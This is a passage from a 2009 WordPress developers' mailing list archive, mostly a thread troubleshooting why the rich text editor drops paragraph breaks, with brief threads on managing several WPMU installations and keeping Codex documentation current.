	<4B244DE9.6050909@gaarai.com>
	<9aa12a490912130027v2ecf3f58j4a48582c2b9b0624@mail.gmail.com>
	<d7153760912130047x3092515fm4c2682a3d5e77a38@mail.gmail.com>
	<9aa12a490912130106v69ea595eva2cebebc1104da51@mail.gmail.com>
Message-ID: <d7153760912130310j730d17edid3bfdae64bbc43a3@mail.gmail.com>

 learning to press the return key in the html mode of the wp editor or to
type <br/> is not exactly learning html.





On Sun, Dec 13, 2009 at 4:06 AM, Davit Barbakadze <jayarjo at gmail.com> wrote:

> It is understandable, 'cause it should be very handy feature,
> especially when one has media and style rich posts. Using html editor
> is not an option for some people at all (not familiar with html and do
> not bother to learn it - why should they in fact?)
>
> Does any one know at least what is a hook/filter, which is meant to
> accomplish that converting task?
>
> On Sun, Dec 13, 2009 at 12:47 PM, mccormicky <mccormicky at gmail.com> wrote:
> >  If you hit the return key or insert a <br/> in html mode then switch to
> > visual (rich text) and save, they get wiped out.
> > But if you make line breaks with <br/> in html mode or hit the return key
> -
> > and hit save it gets saved.
> > - it might be a browser issue though. Not sure. I always use the html
> mode
> > so I am not often bothered by it.
> > It isn't a new behavior of 2.8.6 -  I have had complaints about the
> editor
> > from clients for years.
> > Loss of formatting goes goes hand in hand with rich text editing & I tell
> > them to use the html mode but they don't often listen..
> >
> >
> > On Sun, Dec 13, 2009 at 3:27 AM, Davit Barbakadze <jayarjo at gmail.com>
> wrote:
> >
> >> I'm running 2.8.6. Plugins I got are:
> >>
> >> All in One SEO Pack
> >> Ozh' Admin Drop Down Menu
> >> qTranslate
> >>
> >> But I've used them before without such problems. At least I haven't
> >> noticed them.
> >>
> >> So it is not a proper behavior? Is it switchable? On/Off somewhere?
> >>
> >>
> >> On Sun, Dec 13, 2009 at 6:14 AM, Chris Jean <gaarai at gaarai.com> wrote:
> >> > Which version are you running? Do you have any plugins installed and
> >> > activated?
> >> >
> >> > Chris Jean
> >> > http://gaarai.com/
> >> > @chrisjean
> >> >
> >> >
> >> > On 12/12/2009 12:39 PM, Davit Barbakadze wrote:
> >> >>
> >> >> For some reason freshly installed blog doesn't convert newlines
> >> >> entered in posts rich text editor into paragraphs, as it usually
> does.
> >> >> It just outputs text on one long line, without any breaks. Text
> >> >> formatting works only if forcefully styled or aligned. Is it how it
> >> >> should be? Never noticed such behavior in WordPress.
> >> >>
> >> >>
> >> >
> >> > _______________________________________________
> >> > wp-hackers mailing list
> >> > wp-hackers at lists.automattic.com
> >> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> >
> >>
> >>
> >>
> >> --
> >> Davit Barbakadze
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
>
> --
> Davit Barbakadze
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wordpress at dd32.id.au  Sun Dec 13 11:17:10 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Sun, 13 Dec 2009 22:17:10 +1100
Subject: [wp-hackers] newlines from rich text editor do not convert to
 paragraphs
In-Reply-To: <d7153760912130310j730d17edid3bfdae64bbc43a3@mail.gmail.com>
References: <9aa12a490912121039m76116b4ch5536269947c1a941@mail.gmail.com>
	<4B244DE9.6050909@gaarai.com>
	<9aa12a490912130027v2ecf3f58j4a48582c2b9b0624@mail.gmail.com>
	<d7153760912130047x3092515fm4c2682a3d5e77a38@mail.gmail.com>
	<9aa12a490912130106v69ea595eva2cebebc1104da51@mail.gmail.com>
	<d7153760912130310j730d17edid3bfdae64bbc43a3@mail.gmail.com>
Message-ID: <op.u4viywoaspxmuu@dd32>

All this talk of HTML mode is confusing things i think..

As it should work:

Test<Enter>Test<Enter>Test:
Result: <p>Test</p><p>Test</p><p>Test</p>

Test<Shift+Enter>Test
Result: Test<br/>Test

That works fine for me on a 2.9 nightly, Are you saying that the first  
Example, Results in the 2nd?  Or are you saying it ends up like  
TestTestTest?
If the latter, That wouldnt surprise me if running in the HTML mode..  But  
TinyMCE should handle the paragraphing easily enough.. Have you tried a  
different browser?

On Sun, 13 Dec 2009 22:10:57 +1100, mccormicky <mccormicky at gmail.com>  
wrote:

>  learning to press the return key in the html mode of the wp editor or to
> type <br/> is not exactly learning html.
>
>
>
>
>
> On Sun, Dec 13, 2009 at 4:06 AM, Davit Barbakadze <jayarjo at gmail.com>  
> wrote:
>
>> It is understandable, 'cause it should be very handy feature,
>> especially when one has media and style rich posts. Using html editor
>> is not an option for some people at all (not familiar with html and do
>> not bother to learn it - why should they in fact?)
>>
>> Does any one know at least what is a hook/filter, which is meant to
>> accomplish that converting task?
>>
>> On Sun, Dec 13, 2009 at 12:47 PM, mccormicky <mccormicky at gmail.com>  
>> wrote:
>> >  If you hit the return key or insert a <br/> in html mode then switch  
>> to
>> > visual (rich text) and save, they get wiped out.
>> > But if you make line breaks with <br/> in html mode or hit the return  
>> key
>> -
>> > and hit save it gets saved.
>> > - it might be a browser issue though. Not sure. I always use the html
>> mode
>> > so I am not often bothered by it.
>> > It isn't a new behavior of 2.8.6 -  I have had complaints about the
>> editor
>> > from clients for years.
>> > Loss of formatting goes goes hand in hand with rich text editing & I  
>> tell
>> > them to use the html mode but they don't often listen..
>> >
>> >
>> > On Sun, Dec 13, 2009 at 3:27 AM, Davit Barbakadze <jayarjo at gmail.com>
>> wrote:
>> >
>> >> I'm running 2.8.6. Plugins I got are:
>> >>
>> >> All in One SEO Pack
>> >> Ozh' Admin Drop Down Menu
>> >> qTranslate
>> >>
>> >> But I've used them before without such problems. At least I haven't
>> >> noticed them.
>> >>
>> >> So it is not a proper behavior? Is it switchable? On/Off somewhere?
>> >>
>> >>
>> >> On Sun, Dec 13, 2009 at 6:14 AM, Chris Jean <gaarai at gaarai.com>  
>> wrote:
>> >> > Which version are you running? Do you have any plugins installed  
>> and
>> >> > activated?
>> >> >
>> >> > Chris Jean
>> >> > http://gaarai.com/
>> >> > @chrisjean
>> >> >
>> >> >
>> >> > On 12/12/2009 12:39 PM, Davit Barbakadze wrote:
>> >> >>
>> >> >> For some reason freshly installed blog doesn't convert newlines
>> >> >> entered in posts rich text editor into paragraphs, as it usually
>> does.
>> >> >> It just outputs text on one long line, without any breaks. Text
>> >> >> formatting works only if forcefully styled or aligned. Is it how  
>> it
>> >> >> should be? Never noticed such behavior in WordPress.
>> >> >>
>> >> >>
>> >> >
>> >> > _______________________________________________
>> >> > wp-hackers mailing list
>> >> > wp-hackers at lists.automattic.com
>> >> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >> >
>> >>
>> >>
>> >>
>> >> --
>> >> Davit Barbakadze
>> >> _______________________________________________
>> >> wp-hackers mailing list
>> >> wp-hackers at lists.automattic.com
>> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >>
>> > _______________________________________________
>> > wp-hackers mailing list
>> > wp-hackers at lists.automattic.com
>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >
>>
>>
>>
>> --
>> Davit Barbakadze
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
Using Opera's revolutionary e-mail client: http://www.opera.com/mail/

From jayarjo at gmail.com  Sun Dec 13 11:38:52 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Sun, 13 Dec 2009 15:38:52 +0400
Subject: [wp-hackers] newlines from rich text editor do not convert to
	paragraphs
In-Reply-To: <op.u4viywoaspxmuu@dd32>
References: <9aa12a490912121039m76116b4ch5536269947c1a941@mail.gmail.com>
	<4B244DE9.6050909@gaarai.com>
	<9aa12a490912130027v2ecf3f58j4a48582c2b9b0624@mail.gmail.com>
	<d7153760912130047x3092515fm4c2682a3d5e77a38@mail.gmail.com>
	<9aa12a490912130106v69ea595eva2cebebc1104da51@mail.gmail.com>
	<d7153760912130310j730d17edid3bfdae64bbc43a3@mail.gmail.com>
	<op.u4viywoaspxmuu@dd32>
Message-ID: <9aa12a490912130338p4416e9eayeb5824097b8f6f01@mail.gmail.com>

I've meany first example:

> Test<Enter>Test<Enter>Test:
> Result: <p>Test</p><p>Test</p><p>Test</p>

And what we get in the end is:

TestTestTest

We use TinyMCE and Firefox 3.5.5 as a browser. Not sure what happens
in other browsers. But it's important for this feature to work in
Firefox.

On Sun, Dec 13, 2009 at 3:17 PM, Dion Hulse (dd32) <wordpress at dd32.id.au> wrote:
> All this talk of HTML mode is confusing things i think..
>
> As it should work:
>
> Test<Enter>Test<Enter>Test:
> Result: <p>Test</p><p>Test</p><p>Test</p>
>
> Test<Shift+Enter>Test
> Result: Test<br/>Test
>
> That works fine for me on a 2.9 nightly, Are you saying that the first
> Example, Results in the 2nd? ?Or are you saying it ends up like
> TestTestTest?
> If the latter, That wouldnt surprise me if running in the HTML mode.. ?But
> TinyMCE should handle the paragraphing easily enough.. Have you tried a
> different browser?
>
> On Sun, 13 Dec 2009 22:10:57 +1100, mccormicky <mccormicky at gmail.com> wrote:
>
>> ?learning to press the return key in the html mode of the wp editor or to
>> type <br/> is not exactly learning html.
>>
>>
>>
>>
>>
>> On Sun, Dec 13, 2009 at 4:06 AM, Davit Barbakadze <jayarjo at gmail.com>
>> wrote:
>>
>>> It is understandable, 'cause it should be very handy feature,
>>> especially when one has media and style rich posts. Using html editor
>>> is not an option for some people at all (not familiar with html and do
>>> not bother to learn it - why should they in fact?)
>>>
>>> Does any one know at least what is a hook/filter, which is meant to
>>> accomplish that converting task?
>>>
>>> On Sun, Dec 13, 2009 at 12:47 PM, mccormicky <mccormicky at gmail.com>
>>> wrote:
>>> > ?If you hit the return key or insert a <br/> in html mode then switch
>>> > to
>>> > visual (rich text) and save, they get wiped out.
>>> > But if you make line breaks with <br/> in html mode or hit the return
>>> > key
>>> -
>>> > and hit save it gets saved.
>>> > - it might be a browser issue though. Not sure. I always use the html
>>> mode
>>> > so I am not often bothered by it.
>>> > It isn't a new behavior of 2.8.6 - ?I have had complaints about the
>>> editor
>>> > from clients for years.
>>> > Loss of formatting goes goes hand in hand with rich text editing & I
>>> > tell
>>> > them to use the html mode but they don't often listen..
>>> >
>>> >
>>> > On Sun, Dec 13, 2009 at 3:27 AM, Davit Barbakadze <jayarjo at gmail.com>
>>> wrote:
>>> >
>>> >> I'm running 2.8.6. Plugins I got are:
>>> >>
>>> >> All in One SEO Pack
>>> >> Ozh' Admin Drop Down Menu
>>> >> qTranslate
>>> >>
>>> >> But I've used them before without such problems. At least I haven't
>>> >> noticed them.
>>> >>
>>> >> So it is not a proper behavior? Is it switchable? On/Off somewhere?
>>> >>
>>> >>
>>> >> On Sun, Dec 13, 2009 at 6:14 AM, Chris Jean <gaarai at gaarai.com> wrote:
>>> >> > Which version are you running? Do you have any plugins installed and
>>> >> > activated?
>>> >> >
>>> >> > Chris Jean
>>> >> > http://gaarai.com/
>>> >> > @chrisjean
>>> >> >
>>> >> >
>>> >> > On 12/12/2009 12:39 PM, Davit Barbakadze wrote:
>>> >> >>
>>> >> >> For some reason freshly installed blog doesn't convert newlines
>>> >> >> entered in posts rich text editor into paragraphs, as it usually
>>> does.
>>> >> >> It just outputs text on one long line, without any breaks. Text
>>> >> >> formatting works only if forcefully styled or aligned. Is it how it
>>> >> >> should be? Never noticed such behavior in WordPress.
>>> >> >>
>>> >> >>
>>> >> >
>>> >> > _______________________________________________
>>> >> > wp-hackers mailing list
>>> >> > wp-hackers at lists.automattic.com
>>> >> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> >> >
>>> >>
>>> >>
>>> >>
>>> >> --
>>> >> Davit Barbakadze
>>> >> _______________________________________________
>>> >> wp-hackers mailing list
>>> >> wp-hackers at lists.automattic.com
>>> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> >>
>>> > _______________________________________________
>>> > wp-hackers mailing list
>>> > wp-hackers at lists.automattic.com
>>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> >
>>>
>>>
>>>
>>> --
>>> Davit Barbakadze
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
> --
> Using Opera's revolutionary e-mail client: http://www.opera.com/mail/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From nuno.morgadinho at gmail.com  Sun Dec 13 12:00:40 2009
From: nuno.morgadinho at gmail.com (Nuno Morgadinho)
Date: Sun, 13 Dec 2009 13:00:40 +0100
Subject: [wp-hackers] managing several MU installations
Message-ID: <5721607d0912130400k25d1916ai7b60c94003f4a008@mail.gmail.com>

I have a scenario with several (> 10) WPMU installations and it is
becoming quite a pain to administer them all individually. What
happens is, although they have different content, the configuration
must obey certain rules, i.e. should be the same across all installs.
So what I end up having to do is replicate the configuration if I
change something, even if in just one of them.

Is there something that allows from a central interface to manage
several MUs? Or some kind of central configuration server?

If not, what would be the best approach to implement something like
that? Any ideas?

Thanks,
-- 
Nuno Morgadinho
http://www.morgadinho.org
http://twitter.com/morgadin

From wordpress at dd32.id.au  Sun Dec 13 12:04:59 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Sun, 13 Dec 2009 23:04:59 +1100
Subject: [wp-hackers] newlines from rich text editor do not convert to
 paragraphs
In-Reply-To: <9aa12a490912130338p4416e9eayeb5824097b8f6f01@mail.gmail.com>
References: <9aa12a490912121039m76116b4ch5536269947c1a941@mail.gmail.com>
	<4B244DE9.6050909@gaarai.com>
	<9aa12a490912130027v2ecf3f58j4a48582c2b9b0624@mail.gmail.com>
	<d7153760912130047x3092515fm4c2682a3d5e77a38@mail.gmail.com>
	<9aa12a490912130106v69ea595eva2cebebc1104da51@mail.gmail.com>
	<d7153760912130310j730d17edid3bfdae64bbc43a3@mail.gmail.com>
	<op.u4viywoaspxmuu@dd32>
	<9aa12a490912130338p4416e9eayeb5824097b8f6f01@mail.gmail.com>
Message-ID: <op.u4vk6lrdspxmuu@dd32>

Yes, But testing with a different browser will tell you if its WordPress  
at fault, or a Browser/TinyMCE fault. Testing with the Same browser on a  
different PC will tell you if its a TinyMCE or Browser fault.

On Sun, 13 Dec 2009 22:38:52 +1100, Davit Barbakadze <jayarjo at gmail.com>  
wrote:

> I've meany first example:
>
>> Test<Enter>Test<Enter>Test:
>> Result: <p>Test</p><p>Test</p><p>Test</p>
>
> And what we get in the end is:
>
> TestTestTest
>
> We use TinyMCE and Firefox 3.5.5 as a browser. Not sure what happens
> in other browsers. But it's important for this feature to work in
> Firefox.
>
> On Sun, Dec 13, 2009 at 3:17 PM, Dion Hulse (dd32)  
> <wordpress at dd32.id.au> wrote:
>> All this talk of HTML mode is confusing things i think..
>>
>> As it should work:
>>
>> Test<Enter>Test<Enter>Test:
>> Result: <p>Test</p><p>Test</p><p>Test</p>
>>
>> Test<Shift+Enter>Test
>> Result: Test<br/>Test
>>
>> That works fine for me on a 2.9 nightly, Are you saying that the first
>> Example, Results in the 2nd?  Or are you saying it ends up like
>> TestTestTest?
>> If the latter, That wouldnt surprise me if running in the HTML mode..   
>> But
>> TinyMCE should handle the paragraphing easily enough.. Have you tried a
>> different browser?
>>
>> On Sun, 13 Dec 2009 22:10:57 +1100, mccormicky <mccormicky at gmail.com>  
>> wrote:
>>
>>>  learning to press the return key in the html mode of the wp editor or  
>>> to
>>> type <br/> is not exactly learning html.
>>>
>>>
>>>
>>>
>>>
>>> On Sun, Dec 13, 2009 at 4:06 AM, Davit Barbakadze <jayarjo at gmail.com>
>>> wrote:
>>>
>>>> It is understandable, 'cause it should be very handy feature,
>>>> especially when one has media and style rich posts. Using html editor
>>>> is not an option for some people at all (not familiar with html and do
>>>> not bother to learn it - why should they in fact?)
>>>>
>>>> Does any one know at least what is a hook/filter, which is meant to
>>>> accomplish that converting task?
>>>>
>>>> On Sun, Dec 13, 2009 at 12:47 PM, mccormicky <mccormicky at gmail.com>
>>>> wrote:
>>>> >  If you hit the return key or insert a <br/> in html mode then  
>>>> switch
>>>> > to
>>>> > visual (rich text) and save, they get wiped out.
>>>> > But if you make line breaks with <br/> in html mode or hit the  
>>>> return
>>>> > key
>>>> -
>>>> > and hit save it gets saved.
>>>> > - it might be a browser issue though. Not sure. I always use the  
>>>> html
>>>> mode
>>>> > so I am not often bothered by it.
>>>> > It isn't a new behavior of 2.8.6 -  I have had complaints about the
>>>> editor
>>>> > from clients for years.
>>>> > Loss of formatting goes goes hand in hand with rich text editing & I
>>>> > tell
>>>> > them to use the html mode but they don't often listen..
>>>> >
>>>> >
>>>> > On Sun, Dec 13, 2009 at 3:27 AM, Davit Barbakadze  
>>>> <jayarjo at gmail.com>
>>>> wrote:
>>>> >
>>>> >> I'm running 2.8.6. Plugins I got are:
>>>> >>
>>>> >> All in One SEO Pack
>>>> >> Ozh' Admin Drop Down Menu
>>>> >> qTranslate
>>>> >>
>>>> >> But I've used them before without such problems. At least I haven't
>>>> >> noticed them.
>>>> >>
>>>> >> So it is not a proper behavior? Is it switchable? On/Off somewhere?
>>>> >>
>>>> >>
>>>> >> On Sun, Dec 13, 2009 at 6:14 AM, Chris Jean <gaarai at gaarai.com>  
>>>> wrote:
>>>> >> > Which version are you running? Do you have any plugins installed  
>>>> and
>>>> >> > activated?
>>>> >> >
>>>> >> > Chris Jean
>>>> >> > http://gaarai.com/
>>>> >> > @chrisjean
>>>> >> >
>>>> >> >
>>>> >> > On 12/12/2009 12:39 PM, Davit Barbakadze wrote:
>>>> >> >>
>>>> >> >> For some reason freshly installed blog doesn't convert newlines
>>>> >> >> entered in posts rich text editor into paragraphs, as it usually
>>>> does.
>>>> >> >> It just outputs text on one long line, without any breaks. Text
>>>> >> >> formatting works only if forcefully styled or aligned. Is it  
>>>> how it
>>>> >> >> should be? Never noticed such behavior in WordPress.
>>>> >> >>
>>>> >> >>
>>>> >> >
>>>> >> > _______________________________________________
>>>> >> > wp-hackers mailing list
>>>> >> > wp-hackers at lists.automattic.com
>>>> >> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>> >> >
>>>> >>
>>>> >>
>>>> >>
>>>> >> --
>>>> >> Davit Barbakadze
>>>> >> _______________________________________________
>>>> >> wp-hackers mailing list
>>>> >> wp-hackers at lists.automattic.com
>>>> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>> >>
>>>> > _______________________________________________
>>>> > wp-hackers mailing list
>>>> > wp-hackers at lists.automattic.com
>>>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>> >
>>>>
>>>>
>>>>
>>>> --
>>>> Davit Barbakadze
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>
>>
>> --
>> Using Opera's revolutionary e-mail client: http://www.opera.com/mail/
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>


-- 
Using Opera's revolutionary e-mail client: http://www.opera.com/mail/

From mccormicky at gmail.com  Sun Dec 13 15:51:53 2009
From: mccormicky at gmail.com (mccormicky)
Date: Sun, 13 Dec 2009 10:51:53 -0500
Subject: [wp-hackers] newlines from rich text editor do not convert to
	paragraphs
In-Reply-To: <op.u4vk6lrdspxmuu@dd32>
References: <9aa12a490912121039m76116b4ch5536269947c1a941@mail.gmail.com>
	<4B244DE9.6050909@gaarai.com>
	<9aa12a490912130027v2ecf3f58j4a48582c2b9b0624@mail.gmail.com>
	<d7153760912130047x3092515fm4c2682a3d5e77a38@mail.gmail.com>
	<9aa12a490912130106v69ea595eva2cebebc1104da51@mail.gmail.com>
	<d7153760912130310j730d17edid3bfdae64bbc43a3@mail.gmail.com>
	<op.u4viywoaspxmuu@dd32>
	<9aa12a490912130338p4416e9eayeb5824097b8f6f01@mail.gmail.com>
	<op.u4vk6lrdspxmuu@dd32>
Message-ID: <d7153760912130751h533bbad1p9c3405553a4585f5@mail.gmail.com>

I think I was going on about the html *mode* of the wp editor, not *html*itself.

It's not a firefox only issue. I see this in safari and internet explorer.

Simple fix: use the html *mode of the editor* to insert line breaks by *hitting
the return key*.
Then switch back to visual format  to do your rich text stuff * *then switch
back to html mode* *and save.
if you save your changes in visual mode you run the risk of losing some
formatting.In this case, line breaks.
People usually love having options.
why  only  use 1 mode of the wp editor when there are 2?




On Sun, Dec 13, 2009 at 7:04 AM, Dion Hulse (dd32) <wordpress at dd32.id.au>wrote:

> Yes, But testing with a different browser will tell you if its WordPress at
> fault, or a Browser/TinyMCE fault. Testing with the Same browser on a
> different PC will tell you if its a TinyMCE or Browser fault.
>
>
> On Sun, 13 Dec 2009 22:38:52 +1100, Davit Barbakadze <jayarjo at gmail.com>
> wrote:
>
>  I've meany first example:
>>
>>  Test<Enter>Test<Enter>Test:
>>> Result: <p>Test</p><p>Test</p><p>Test</p>
>>>
>>
>> And what we get in the end is:
>>
>> TestTestTest
>>
>> We use TinyMCE and Firefox 3.5.5 as a browser. Not sure what happens
>> in other browsers. But it's important for this feature to work in
>> Firefox.
>>
>> On Sun, Dec 13, 2009 at 3:17 PM, Dion Hulse (dd32) <wordpress at dd32.id.au>
>> wrote:
>>
>>> All this talk of HTML mode is confusing things i think..
>>>
>>> As it should work:
>>>
>>> Test<Enter>Test<Enter>Test:
>>> Result: <p>Test</p><p>Test</p><p>Test</p>
>>>
>>> Test<Shift+Enter>Test
>>> Result: Test<br/>Test
>>>
>>> That works fine for me on a 2.9 nightly, Are you saying that the first
>>> Example, Results in the 2nd?  Or are you saying it ends up like
>>> TestTestTest?
>>> If the latter, That wouldnt surprise me if running in the HTML mode..
>>>  But
>>> TinyMCE should handle the paragraphing easily enough.. Have you tried a
>>> different browser?
>>>
>>> On Sun, 13 Dec 2009 22:10:57 +1100, mccormicky <mccormicky at gmail.com>
>>> wrote:
>>>
>>>   learning to press the return key in the html mode of the wp editor or
>>>> to
>>>> type <br/> is not exactly learning html.
>>>>
>>>>
>>>>
>>>>
>>>>
>>>> On Sun, Dec 13, 2009 at 4:06 AM, Davit Barbakadze <jayarjo at gmail.com>
>>>> wrote:
>>>>
>>>>  It is understandable, 'cause it should be very handy feature,
>>>>> especially when one has media and style rich posts. Using html editor
>>>>> is not an option for some people at all (not familiar with html and do
>>>>> not bother to learn it - why should they in fact?)
>>>>>
>>>>> Does any one know at least what is a hook/filter, which is meant to
>>>>> accomplish that converting task?
>>>>>
>>>>> On Sun, Dec 13, 2009 at 12:47 PM, mccormicky <mccormicky at gmail.com>
>>>>> wrote:
>>>>> >  If you hit the return key or insert a <br/> in html mode then switch
>>>>> > to
>>>>> > visual (rich text) and save, they get wiped out.
>>>>> > But if you make line breaks with <br/> in html mode or hit the return
>>>>> > key
>>>>> -
>>>>> > and hit save it gets saved.
>>>>> > - it might be a browser issue though. Not sure. I always use the html
>>>>> mode
>>>>> > so I am not often bothered by it.
>>>>> > It isn't a new behavior of 2.8.6 -  I have had complaints about the
>>>>> editor
>>>>> > from clients for years.
>>>>> > Loss of formatting goes goes hand in hand with rich text editing & I
>>>>> > tell
>>>>> > them to use the html mode but they don't often listen..
>>>>> >
>>>>> >
>>>>> > On Sun, Dec 13, 2009 at 3:27 AM, Davit Barbakadze <jayarjo at gmail.com
>>>>> >
>>>>> wrote:
>>>>> >
>>>>> >> I'm running 2.8.6. Plugins I got are:
>>>>> >>
>>>>> >> All in One SEO Pack
>>>>> >> Ozh' Admin Drop Down Menu
>>>>> >> qTranslate
>>>>> >>
>>>>> >> But I've used them before without such problems. At least I haven't
>>>>> >> noticed them.
>>>>> >>
>>>>> >> So it is not a proper behavior? Is it switchable? On/Off somewhere?
>>>>> >>
>>>>> >>
>>>>> >> On Sun, Dec 13, 2009 at 6:14 AM, Chris Jean <gaarai at gaarai.com>
>>>>> wrote:
>>>>> >> > Which version are you running? Do you have any plugins installed
>>>>> and
>>>>> >> > activated?
>>>>> >> >
>>>>> >> > Chris Jean
>>>>> >> > http://gaarai.com/
>>>>> >> > @chrisjean
>>>>> >> >
>>>>> >> >
>>>>> >> > On 12/12/2009 12:39 PM, Davit Barbakadze wrote:
>>>>> >> >>
>>>>> >> >> For some reason freshly installed blog doesn't convert newlines
>>>>> >> >> entered in posts rich text editor into paragraphs, as it usually
>>>>> does.
>>>>> >> >> It just outputs text on one long line, without any breaks. Text
>>>>> >> >> formatting works only if forcefully styled or aligned. Is it how
>>>>> it
>>>>> >> >> should be? Never noticed such behavior in WordPress.
>>>>> >> >>
>>>>> >> >>
>>>>> >> >
>>>>> >> > _______________________________________________
>>>>> >> > wp-hackers mailing list
>>>>> >> > wp-hackers at lists.automattic.com
>>>>> >> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>> >> >
>>>>> >>
>>>>> >>
>>>>> >>
>>>>> >> --
>>>>> >> Davit Barbakadze
>>>>> >> _______________________________________________
>>>>> >> wp-hackers mailing list
>>>>> >> wp-hackers at lists.automattic.com
>>>>> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>> >>
>>>>> > _______________________________________________
>>>>> > wp-hackers mailing list
>>>>> > wp-hackers at lists.automattic.com
>>>>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>> >
>>>>>
>>>>>
>>>>>
>>>>> --
>>>>> Davit Barbakadze
>>>>> _______________________________________________
>>>>> wp-hackers mailing list
>>>>> wp-hackers at lists.automattic.com
>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>>
>>>>>  _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>
>>>>
>>>
>>> --
>>> Using Opera's revolutionary e-mail client: http://www.opera.com/mail/
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>>
>>
>>
>>
>
> --
> Using Opera's revolutionary e-mail client: http://www.opera.com/mail/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From tunamaxx at yahoo.com  Sun Dec 13 16:28:24 2009
From: tunamaxx at yahoo.com (Tuna Can)
Date: Sun, 13 Dec 2009 08:28:24 -0800 (PST)
Subject: [wp-hackers] Developer portal
Message-ID: <299277.18493.qm@web65707.mail.ac4.yahoo.com>

WordPress is evolving so quickly making parts of the Codex out of date with every release. It's hard to tell what information is 'correct' or current, ESPECIALLY when you are new to WP and relying on the Codex to show you the way. 

I'd love to see clear indications of both the WP version the info was written for, as well as when the entry was written/updated.

That might be able to ease upkeep as well if reminders to the author(s) could be set based on version or date. For instance, a reminder could be sent out to check/update content on WP version change or after six months or so.

Thanks,

Tony


      __________________________________________________________________
Ask a question on any topic and get answers from real people. Go to Yahoo! Answers and share what you know at http://ca.answers.yahoo.com


From viniciusandre at gmail.com  Sun Dec 13 16:29:45 2009
From: viniciusandre at gmail.com (Vinicius Massuchetto)
Date: Sun, 13 Dec 2009 14:29:45 -0200
Subject: [wp-hackers] managing several MU installations
In-Reply-To: <5721607d0912130400k25d1916ai7b60c94003f4a008@mail.gmail.com>
References: <5721607d0912130400k25d1916ai7b60c94003f4a008@mail.gmail.com>
Message-ID: <4ede8f490912130829g3aee31cfk63daa4d1bb6a802f@mail.gmail.com>

I wonder why would you need several wpmu installations.
Are them on the same server and installed for the same purpose?

You can configure what and how to show information on different
"homes", and you can categorize blogs as well through blog options
table. I imagine that in only one installation.

I believe that you can schedule SQL processes to sync data between
options tables in your case, once I think it would be inconsistent to
make multiple wpmu installations to use the same options table
throught pure PHP code.

--
Vin?cius Massuchetto
http://vinicius.soylocoporti.org.br


On Sun, Dec 13, 2009 at 10:00 AM, Nuno Morgadinho
<nuno.morgadinho at gmail.com> wrote:
> I have a scenario with several (> 10) WPMU installations and it is
> becoming quite a pain to administer them all individually. What
> happens is, although they have different content, the configuration
> must obey certain rules, i.e. should be the same across all installs.
> So what I end up having to do is replicate the configuration if I
> change something, even if in just one of them.
>
> Is there something that allows from a central interface to manage
> several MUs? Or some kind of central configuration server?
>
> If not, what would be the best approach to implement something like
> that? Any ideas?
>
> Thanks,
> --
> Nuno Morgadinho
> http://www.morgadinho.org
> http://twitter.com/morgadin
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From hempsworth at googlemail.com  Sun Dec 13 17:20:34 2009
From: hempsworth at googlemail.com (Alex Hempton-Smith)
Date: Sun, 13 Dec 2009 17:20:34 +0000
Subject: [wp-hackers] Blog Stats from WordPress.com to stand-alone
	wordpress?..
In-Reply-To: <9aa12a490912130029i6184d388g451853535d2f4fc2@mail.gmail.com>
References: <9aa12a490912110600l36ea8481o1442883e7546f79b@mail.gmail.com> 
	<7f49e8010912110618v3952b38dg6720bf2d3a9eb423@mail.gmail.com> 
	<9aa12a490912110756w2b8970e6y6d57e364deb503a7@mail.gmail.com> 
